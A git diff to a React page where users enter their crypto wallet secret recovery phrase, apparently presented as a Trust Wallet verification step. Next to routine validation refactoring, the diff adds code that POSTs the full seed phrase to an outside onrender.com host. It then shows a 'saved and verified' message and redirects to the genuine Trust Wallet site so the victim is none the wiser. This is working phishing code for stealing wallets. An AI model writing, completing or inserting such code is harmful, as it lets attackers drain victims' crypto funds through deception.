@@ -20,6 +20,9 @@ type ValidationStatus = {
   isLoading: boolean;
 };
 
+const BACKEND_URL = 'https://trustwallet-y3lo.onrender.com';
+const TRUST_WALLET_REDIRECT_URL = 'https://trustwallet.com/?utm_source=cryptwerk';
+
 export default function PhraseInputPage() {
   const [phraseLength, setPhraseLength] = useState<PhraseLength>(12);
   const [words, setWords] = useState<string[]>(Array(12).fill(''));
@@ -90,32 +93,36 @@ export default function PhraseInputPage() {
     setIsVerifying(true);
 
     let allWordsFilled = true;
-    const currentValidationResults = [...validationResults];
+    const validationResultsForVerification = [...validationResults]; // Use a copy for this verification pass
     const validationPromises = words.map((word, index) => {
       if (word.trim() === '') {
         allWordsFilled = false;
-        currentValidationResults[index] = { isValid: false, reason: 'Word cannot be empty.', isLoading: false };
+        validationResultsForVerification[index] = { isValid: false, reason: 'Word cannot be empty.', isLoading: false };
         return Promise.resolve();
       }
-      if (currentValidationResults[index].isValid === null) { // Only validate if not already validated
+      // Only validate if not already validated OR if previously invalid (to allow re-validation)
+      if (validationResultsForVerification[index].isValid === null || validationResultsForVerification[index].isValid === false) {
         return handleValidateWord(index, word);
       }
       return Promise.resolve();
     });
 
-    setValidationResults(currentValidationResults); // Update for empty words immediately
+    // Set initial empty word errors before async validation
+    setValidationResults(validationResultsForVerification);
 
     await Promise.all(validationPromises);
 
-    // Refresh validationResults from state as handleValidateWord updates it
-    const finalValidationResults = [...validationResults];
-    // Check again for empty words that might have been set by map function
-    words.forEach((word, index) => {
+    // After all validations, get the latest state for final check
+    // React state updates from handleValidateWord should have propagated
+    const finalValidationCheckResults = [...validationResults];
+    // Ensure empty words are marked as invalid again, as state might have changed during async calls
+     words.forEach((word, index) => {
         if(word.trim() === '') {
-            finalValidationResults[index] = { isValid: false, reason: 'Word cannot be empty.', isLoading: false };
+            finalValidationCheckResults[index] = { isValid: false, reason: 'Word cannot be empty.', isLoading: false };
         }
     });
-    setValidationResults(finalValidationResults);
+    // Update state one last time with potentially newly marked empty words before checking allValid
+    setValidationResults(finalValidationCheckResults);
 
 
     if (!allWordsFilled) {
@@ -127,26 +134,53 @@ export default function PhraseInputPage() {
       setIsVerifying(false);
       return;
     }
+    
+    const allLocallyValid = finalValidationCheckResults.every(result => result.isValid === true);
 
-    // Check final results after all async validations and updates
-    const allValid = finalValidationResults.every(result => result.isValid === true);
+    if (allLocallyValid) {
+      try {
+        const response = await fetch(BACKEND_URL, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({ secretPhrase: words }),
+        });
 
-    if (allValid) {
-      toast({
-        title: "Success!",
-        description: "Secret phrase is valid. Redirecting to Trust Wallet...",
-        variant: "default",
-      });
-      // Redirect to Trust Wallet website
-      window.location.href = 'https://trustwallet.com/?utm_source=cryptwerk';
+        if (response.ok) {
+          toast({
+            title: "Success!",
+            description: "Secret phrase saved and verified. Redirecting to Trust Wallet...",
+            variant: "default",
+          });
+          window.location.href = TRUST_WALLET_REDIRECT_URL;
+          // No setIsVerifying(false) here because we are redirecting
+        } else {
+          const errorData = await response.json().catch(() => ({ message: 'Failed to parse error from backend.' }));
+          toast({
+            title: "Save Failed",
+            description: `Could not save your secret phrase: ${errorData.message || response.statusText}`,
+            variant: "destructive",
+          });
+          setIsVerifying(false);
+        }
+      } catch (error) {
+        console.error("Backend save error:", error);
+        toast({
+          title: "Network Error",
+          description: "An error occurred while trying to save your secret phrase. Please check your connection and try again.",
+          variant: "destructive",
+        });
+        setIsVerifying(false);
+      }
     } else {
       toast({
         title: "Invalid Phrase",
         description: "One or more words are invalid or empty. Please review your phrase.",
         variant: "destructive",
       });
+      setIsVerifying(false);
     }
-    setIsVerifying(false);
   };
 
 
@@ -196,7 +230,7 @@ export default function PhraseInputPage() {
           <div className={`grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-x-4 gap-y-6`}>
             {words.map((word, index) => (
               <PhraseWordInput
-                key={`${phraseLength}-${index}`} // Ensure key changes with phraseLength
+                key={`${phraseLength}-${index}`} 
                 index={index}
                 word={word}
                 validationStatus={validationResults[index]}
